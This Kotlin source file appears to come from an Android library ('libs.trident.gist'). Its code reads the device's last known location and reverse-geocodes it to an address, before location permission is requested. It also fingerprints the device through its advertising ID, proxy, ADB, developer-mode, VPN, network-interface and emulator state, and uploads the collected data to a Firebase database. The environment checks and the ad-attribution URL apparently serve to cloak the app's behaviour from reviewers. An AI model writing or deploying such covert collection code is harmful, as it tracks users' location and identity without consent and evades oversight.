package libs.trident.gist

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.location.LocationManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import libs.trident.gist.constants.Constants
import libs.trident.gist.constants.Constants.adId
import libs.trident.gist.constants.Constants.ad_id_key
import libs.trident.gist.constants.Constants.adb
import libs.trident.gist.constants.Constants.adb_key
import libs.trident.gist.constants.Constants.adgroup
import libs.trident.gist.constants.Constants.adgroup_key
import libs.trident.gist.constants.Constants.adset
import libs.trident.gist.constants.Constants.adsetId
import libs.trident.gist.constants.Constants.adset_id_key
import libs.trident.gist.constants.Constants.adset_key
import libs.trident.gist.constants.Constants.afId
import libs.trident.gist.constants.Constants.afSteid
import libs.trident.gist.constants.Constants.af_id_key
import libs.trident.gist.constants.Constants.af_siteid_key
import libs.trident.gist.constants.Constants.appCampaign
import libs.trident.gist.constants.Constants.app_campaign_key
import libs.trident.gist.constants.Constants.autoZone
import libs.trident.gist.constants.Constants.autoZone_key
import libs.trident.gist.constants.Constants.battery
import libs.trident.gist.constants.Constants.battery_key
import libs.trident.gist.constants.Constants.campaignId
import libs.trident.gist.constants.Constants.campaign_id_key
import libs.trident.gist.constants.Constants.deeplink
import libs.trident.gist.constants.Constants.deeplink_key
import libs.trident.gist.constants.Constants.devTmz
import libs.trident.gist.constants.Constants.dev_tmz_key
import libs.trident.gist.constants.Constants.finalUrl
import libs.trident.gist.constants.Constants.gadid
import libs.trident.gist.constants.Constants.gadid_key
import libs.trident.gist.constants.Constants.lockpin
import libs.trident.gist.constants.Constants.lockpin_key
import libs.trident.gist.constants.Constants.manufacture
import libs.trident.gist.constants.Constants.manufacture_key
import libs.trident.gist.constants.Constants.model
import libs.trident.gist.constants.Constants.model_key
import libs.trident.gist.constants.Constants.origCost
import libs.trident.gist.constants.Constants.orig_cost_key
import libs.trident.gist.constants.Constants.secure_get_parametr
import libs.trident.gist.constants.Constants.secure_key
import libs.trident.gist.constants.Constants.source
import libs.trident.gist.constants.Constants.source_key
import libs.trident.gist.constants.Constants.vpn
import libs.trident.gist.constants.Constants.vpn_key
import libs.trident.gist.storage.Repository
import libs.trident.gist.storage.persistroom.LinkDatabase
import android.location.Geocoder

import android.content.pm.PackageManager

import android.location.Address
import android.net.ConnectivityManager
import android.os.Build
import android.provider.Settings
import android.util.Log

import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat.getSystemService
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import java.lang.Exception
import java.net.NetworkInterface
import java.text.SimpleDateFormat
import java.util.*


object Utils {

    //processing final url
    fun processDataToFinalUrl() {
        finalUrl = finalUrl +
                "?$secure_get_parametr=$secure_key" +
                "&$dev_tmz_key=$devTmz" +
                "&$adb_key=$adb" +
                "&$autoZone_key=$autoZone" +
                "&$vpn_key=$vpn" +
                "&$battery_key=$battery" +
                "&$model_key=$model" +
                "&$manufacture_key=$manufacture" +
                "&$lockpin_key=$lockpin" +
                "&$gadid_key=$gadid" +
                "&$deeplink_key=$deeplink" +
                "&$source_key=$source" +
                "&$af_id_key=$afId" +
                "&$ad_id_key=$adId" +
                "&$adset_id_key=$adsetId" +
                "&$campaign_id_key=$campaignId" +
                "&$app_campaign_key=$appCampaign" +
                "&$adset_key=$adset" +
                "&$adgroup_key=$adgroup" +
                "&$orig_cost_key=$origCost" +
                "&$af_siteid_key=$afSteid"
    }


    //checking data on null vars and rearrange them
    fun rearrangeData() {
        if (adId.isEmpty()) adId = "null"

        if (adsetId.isEmpty()) adsetId = "null"

        if (campaignId.isEmpty()) campaignId = "null"

        if (appCampaign.isEmpty()) appCampaign = "null"

        if (adset.isEmpty()) adset = "null"

        if (adgroup.isEmpty()) adgroup = "null"

        if (origCost.isEmpty()) origCost = "null"

        if (afSteid.isEmpty()) afSteid = "null"

        if (battery.isEmpty()) battery = "null"

        if (vpn.isEmpty()) vpn = "null"

        if (model.isEmpty()) model = "null"

        if (manufacture.isEmpty()) manufacture = "null"

        if (gadid.isEmpty()) gadid = "null"

        if (deeplink.isEmpty()) deeplink = "null"

        if (source.isEmpty()) source = "null"

        if (afId.isEmpty()) afId = "null"

        if (devTmz.isEmpty()) devTmz = "null"
    }

    //creating repository instance
    fun createRepoInstance(context: Context): Repository {
        if (Constants.repository == null) {
            return Repository(LinkDatabase.getDatabase(context).linkDao())
        } else {
            return Constants.repository as Repository
        }
    }


    fun collectData(activity: AppCompatActivity): Map<String, String> {
        val map: MutableMap<String, String> = mutableMapOf()

        map["adid"] = gadid

        map["location"] = collectLocation(activity)
        map["http-proxy"] = collectHttpProxy(activity)
        map["allow-install-non-market-apps"] = collectAllowInstallNonMarketApps(activity)
        map["adb-enabled"] = collectAdbEnabled(activity)
        map["parental-controls"] = collectParentalControl(activity)
        map["debug-app"] = collectDebugApp(activity)
        map["developer-setting-enabled"] = collectDeveloperSettingsEnabled(activity)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            map["boot-count"] = collectBootCount(activity)
        }
        map["wi-fi-static-ip"] = collectWiFiStaticIp(activity)
        map["wi-fi-static-dns1"] = collectWiFiStaticDns1(activity)
        map["wi-fi-static-dns2"] = collectWiFiStaticDns2(activity)
        map["wi-fi-static-gateway"] = collectWiFiStaticGateWay(activity)
        map["wi-fi-static-net-mask"] = collectWiFiStaticNetMask(activity)
        map["auto-zone"] = collectWiFiAutoZonek(activity)
        map["auto-time"] = collectWiFiAutoTime(activity)
        map["geo-location-origins"] = collectGeoLocationOrigins(activity)
        map["mock-location"] = collectMockLocation(activity)
        map["time-zone"] = TimeZone.getDefault().toString()

        val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
        val currentDateandTime: String = sdf.format(Date())
        map["time"] = currentDateandTime
        map["tun-vpn"] = checkVpn().toString()
        map["network-interfaces"] = NetworkInterface.getNetworkInterfaces().toList().joinToString()

        Log.d("library", "$map map main")

        return map
    }

    private fun checkVpn(): Boolean{
        val networkList: MutableList<String> = ArrayList()
        try {
            for (networkInterface in Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (networkInterface.isUp) networkList.add(networkInterface.name)
            }
        } catch (ex: Exception) {
        }

        return networkList.contains("tun0") || networkList.contains("tun1")
    }

    fun putToRealtimeDatabase(activity: AppCompatActivity){
        // Write a message to the database
        // Write a message to the database
        val database: FirebaseDatabase = FirebaseDatabase.getInstance()
        val myRef: DatabaseReference = database.reference

        myRef.child(UUID.randomUUID().toString()).setValue(collectData(activity))
    }


    @SuppressLint("MissingPermission")
    fun collectLocation(activity: AppCompatActivity): String {


        var gps_loc: Location? = null
        var network_loc: Location? = null
        var final_loc: Location? = null
        var longitude: Double
        var latitude: Double
        var userCountry: String? = "nothing"
        var userAddress: String? = "nothing"

        val locationManager =
            activity.getSystemService(Context.LOCATION_SERVICE) as LocationManager?



        if (ActivityCompat.checkSelfPermission(
                activity,
                android.Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                activity,
                android.Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                activity,
                android.Manifest.permission.ACCESS_NETWORK_STATE
            ) != PackageManager.PERMISSION_GRANTED
        ) {

        }

        try {
            gps_loc = locationManager!!.getLastKnownLocation(LocationManager.GPS_PROVIDER)!!
            network_loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)!!
        } catch (e: Exception) {
            e.printStackTrace()
        }

        if (gps_loc != null) {
            final_loc = gps_loc
            latitude = final_loc.latitude
            longitude = final_loc.longitude
        } else if (network_loc != null) {
            final_loc = network_loc
            latitude = final_loc.latitude
            longitude = final_loc.longitude
        } else {
            latitude = 0.0
            longitude = 0.0
        }


        ActivityCompat.requestPermissions(
            activity,
            arrayOf(
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.ACCESS_NETWORK_STATE
            ),
            1
        )

        try {
            val geocoder = Geocoder(activity, Locale.getDefault())
            val addresses: List<Address>? = geocoder.getFromLocation(latitude, longitude, 1)
            if (addresses != null && addresses.isNotEmpty()) {
                userCountry = addresses[0].countryName
                userAddress = addresses[0].getAddressLine(0)

            } else {
                userCountry = "Unknown"
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        return ("$latitude $longitude $userCountry $userAddress ")
    }

    fun collectHttpProxy(activity: AppCompatActivity): String{

        return Settings.Global.getString(activity.contentResolver, Settings.Global.HTTP_PROXY)  ?: "null"

    }

    fun collectAllowInstallNonMarketApps(activity: AppCompatActivity): String {

        return Settings.Global.getString(activity.contentResolver,Settings.Global.INSTALL_NON_MARKET_APPS)  ?: "null"
    }

    fun collectAdbEnabled(activity: AppCompatActivity): String{

        return Settings.Global.getString(activity.contentResolver, Settings.Global.ADB_ENABLED)  ?: "null"
    }

    fun collectParentalControl(activity: AppCompatActivity): String {

        return Settings.Global.getString(activity.contentResolver, Settings.Secure.PARENTAL_CONTROL_ENABLED)  ?: "null"
    }

    fun collectDebugApp(activity: AppCompatActivity): String {

        return Settings.Global.getString(activity.contentResolver,Settings.Global.DEBUG_APP)  ?: "null"

    }

    fun collectDeveloperSettingsEnabled(activity: AppCompatActivity): String {

        return Settings.Global.getString(activity.contentResolver,Settings.Global.DEVELOPMENT_SETTINGS_ENABLED)  ?: "null"
    }


    @RequiresApi(Build.VERSION_CODES.N)
    fun collectBootCount(activity: AppCompatActivity): String {
        return Settings.Global.getString(activity.contentResolver,Settings.Global.BOOT_COUNT)  ?: "null"
    }

    fun collectWiFiStaticIp(activity: AppCompatActivity): String {

        return Settings.Global.getString(activity.contentResolver,Settings.System.WIFI_STATIC_IP)  ?: "null"
    }

    fun collectWiFiStaticGateWay(activity: AppCompatActivity): String{

        return Settings.Global.getString(activity.contentResolver,Settings.System.WIFI_STATIC_GATEWAY)  ?: "null"
    }

    fun collectWiFiStaticDns1(activity: AppCompatActivity): String{

        return Settings.Global.getString(activity.contentResolver,Settings.System.WIFI_STATIC_DNS1)  ?: "null"
    }

    fun collectWiFiStaticDns2(activity: AppCompatActivity): String{

        return Settings.Global.getString(activity.contentResolver,Settings.System.WIFI_STATIC_DNS2)  ?: "null"
    }

    fun collectWiFiStaticNetMask(activity: AppCompatActivity): String{

        return Settings.Global.getString(activity.contentResolver,Settings.System.WIFI_STATIC_NETMASK)  ?: "null"
    }

    fun collectWiFiAutoZonek(activity: AppCompatActivity): String{

        return Settings.Global.getString(activity.contentResolver,Settings.System.AUTO_TIME_ZONE) ?: "null"
    }

    fun collectWiFiAutoTime(activity: AppCompatActivity): String{

        return Settings.Global.getString(activity.contentResolver,Settings.System.AUTO_TIME) ?: "null"
    }

    fun collectGeoLocationOrigins(activity: AppCompatActivity): String {

        return Settings.Global.getString(activity.contentResolver,Settings.Secure.ALLOWED_GEOLOCATION_ORIGINS) ?: "null"
    }


    fun collectMockLocation(activity: AppCompatActivity): String {

        return Settings.Global.getString(activity.contentResolver,Settings.Secure.ALLOW_MOCK_LOCATION) ?: "null"
    }


     fun isNetworkConnected(activity: AppCompatActivity): Boolean {
        val cm = activity.getSystemService(AppCompatActivity.CONNECTIVITY_SERVICE) as ConnectivityManager
        return cm.activeNetworkInfo != null && cm.activeNetworkInfo!!.isConnected
    }

    //check on android virtual device
    fun isProbablyRunningOnEmulator(): Boolean {
        return Build.FINGERPRINT.contains("generic")
    }



}